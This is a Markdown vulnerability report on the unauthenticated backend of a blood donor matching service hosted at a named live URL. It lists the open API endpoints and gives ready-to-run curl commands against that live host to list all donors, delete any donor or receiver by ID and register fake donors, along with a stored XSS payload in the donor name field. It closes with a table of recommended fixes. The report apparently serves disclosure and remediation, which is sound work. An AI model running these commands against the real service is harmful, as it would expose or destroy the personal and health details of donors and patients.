# 🩸 Bloodline Backend Vulnerability PoC Report

## 🔍 Overview
This document outlines proof-of-concept (PoC) exploits for vulnerabilities discovered in the publicly exposed backend of the Bloodline Project deployed at:

> **https://bloodline-server.vercel.app**

---

## 📂 API Endpoints (Unauthenticated)

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Health check |
| `/donors` | GET | List all donors |
| `/donors` | POST | Register new donor |
| `/donors/:id` | DELETE | Delete donor by ID |
| `/receivers` | GET | List receivers |
| `/receivers` | POST | Register receiver |
| `/receivers/match?bloodGroup=X` | GET | Match donors |
| `/stats/donors` | GET | Total donors |
| `/stats/receivers` | GET | Total receivers |
| `/search?location=X` | GET | Query hospitals & blood banks |

---

## 🚨 PoC #1: Delete Any Donor/Receiver (No Auth Required)

### ➤ Step 1: List all donors
```bash
curl https://bloodline-server.vercel.app/donors
```
### ➤ Step 2: Delete donor by ID
```bash
curl -X DELETE https://bloodline-server.vercel.app/donors/<donor-id>
```
Same goes for receivers also
## 📌 PoC #2: Register Arbitrary Donor
The following curl command replicates what the donor registration form submits. This bypasses any client-side restrictions and allows direct backend access.
```bash
curl -X POST https://bloodline-server.vercel.app/donors \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "Exploit User",
    "address": "123 Fake Street",
    "bloodGroup": "O+",
    "mobile": "1234567890",
    "email": "exploit@poc.com",
    "weight": 50,
    "age": 19,
    "diseases": "None"
  }'
```
🔥 This means no validation or authorization stops anyone from registering arbitrary/fake donors directly through the backend.
## 💉PoC #3: Stored XSS in Donor Name Field
This poC was tested locally. May or may not reflect on the live site.
```bash
curl -X POST http://localhost:5000/donors \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "<script>alert(`XSS`)</script>",
    "email": "xss@example.com",
    "bloodGroup": "O+",
    "location": "Testville",
    "diseases": "None"
  }'
```
## ⚠️ Recommendations
|Issue |	Fix |
|----------|--------|
|🔓 Donor deletion without auth | Require authentication & authorization|
|📋 Public donor enumeration	| Rate-limit and/or restrict access|
|🧫 Unverified donor input	| Implement CAPTCHA or email verification|
|🔐 No API key restriction on /search |	Validate usage server-side or limit externally|
|🐛 Stored XSS via donor input	| Sanitize user input and encode output properly|
